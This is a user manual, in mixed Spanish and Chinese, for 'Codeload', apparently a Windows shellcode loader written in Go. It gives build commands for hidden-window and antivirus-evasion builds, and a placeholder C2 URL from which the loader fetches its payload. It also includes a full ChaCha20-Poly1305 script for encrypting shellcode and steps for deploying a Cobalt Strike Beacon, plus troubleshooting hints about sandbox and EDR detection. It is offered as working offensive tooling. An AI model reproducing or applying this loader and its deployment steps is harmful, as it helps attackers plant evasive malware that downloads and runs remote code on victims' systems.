# Manual de usuario Codeload

## 1. Guía de compilación

Este proyecto se desarrolló utilizando el lenguaje de programación Go. Debido a la implicación de llamadas al sistema de bajo nivel y lenguaje ensamblador, se debe tener cuidado de usar durante la compilación `Build Tags`。

### 1.1 Versión de lanzamiento base (recomendada para su lanzamiento)
No contiene registros ni información de depuración, lo que minimiza los residuos de huellas dactilares.
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o release.exe
```
*   `-H=windowsgui`: Ocultar la ventana de la consola.
*   `-s -w`: Eliminar símbolos de depuración.

### 1.2 Versión de evasión mejorada
Habilitar todas las funciones de evasión (anti-sandbox, protección ETW, engaño de pila).
```bash
GOOS=windows GOARCH=amd64 go build -tags "sandbox,evasion" -ldflags="-s -w -H=windowsgui" -o codeload_adv.exe
```

### 1.3 Versión de depuración
Habilite la salida en tiempo real en la consola para solucionar el problema por el cual falló la carga útil.
```bash
GOOS=windows GOARCH=amd64 go build -tags "debug,sandbox,evasion" -ldflags="-s -w" -o debug.exe
```
*   **Aviso**: La versión de depuración elimina `-H=windowsgui`, que hará que aparezca una ventana negra que muestra registros detallados durante la ejecución.

---

## 2. Instrucciones de configuración

Antes de compilar, debe configurar la dirección C2 remota en `main.go`:

```go
var (
    // Esta URL debe apuntar a un archivo de texto que almacena la dirección de descarga real de la carga útil.
    configURL = "http://your-c2-domain.com/config.txt"
)
```

---

## 3. Payload Preparación y cifrado

Codeload Utiliza un formato de cifrado personalizado（ChaCha20-Poly1305），Payload La estructura contiene 512 Relleno aleatorio de bytes y 4 Encabezado de longitud de bytes。Los datos sin procesar deben procesarse utilizando un script de cifrado correspondiente. Shellcode。

### 3.1 Script cifrado (`encryptor.go`)
Guarde y ejecute el siguiente código:

```go
package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"golang.org/x/crypto/chacha20poly1305"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("用法: go run encryptor.go <原始载荷.bin> <输出文件.enc>")
		return
	}
	sc, _ := os.ReadFile(os.Args[1])
	
	// 构造明文: [512字节填充] [4字节长度] [Shellcode]
	pad := make([]byte, 512)
	rand.Read(pad)
	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(sc)))
	plaintext := append(pad, lenBuf...)
	plaintext = append(plaintext, sc...)

	// 生成密钥与随机数
	key := make([]byte, chacha20poly1305.KeySize)
	nonce := make([]byte, chacha20poly1305.NonceSize)
	rand.Read(key)
	rand.Read(nonce)

	aead, _ := chacha20poly1305.New(key)
	ciphertext := aead.Seal(nil, nonce, plaintext, nil)

	// 最终结构: [Nonce] [密文] [Key]
	final := append(nonce, ciphertext...)
	final = append(final, key...)
	os.WriteFile(os.Args[2], final, 0644)
	fmt.Printf("[+] 加密载荷已保存: %s\n", os.Args[2])
}
```

### 3.2 部署步骤
1. 使用上述脚本加密你的 Shellcode (如 Cobalt Strike Beacon)。
2. 将加密后的文件上传至 Web 服务器。
3. 将该文件的 URL 写入 `config.txt` 并上传至 `configURL` 指向的位置。

---

## 4. 常见问题排查 (Debug 模式)

如果在上线过程中遇到失败，请编译 Debug 版本并观察输出：
- **`[-] Uptime check failed`**: 系统运行时间不足 10 分钟（反沙箱触发）。
- **`[-] Failed to get SSN`**: 系统调用号解析失败，可能是 `ntdll` 结构异常或 EDR 深度拦截。
- **`[-] Config download failed`**: 网络连接问题，检查 C2 地址及证书配置（uTLS）。
- **`[-] Protect RX failed`**: 内存权限修改失败，可能是由于写权限探测警报。
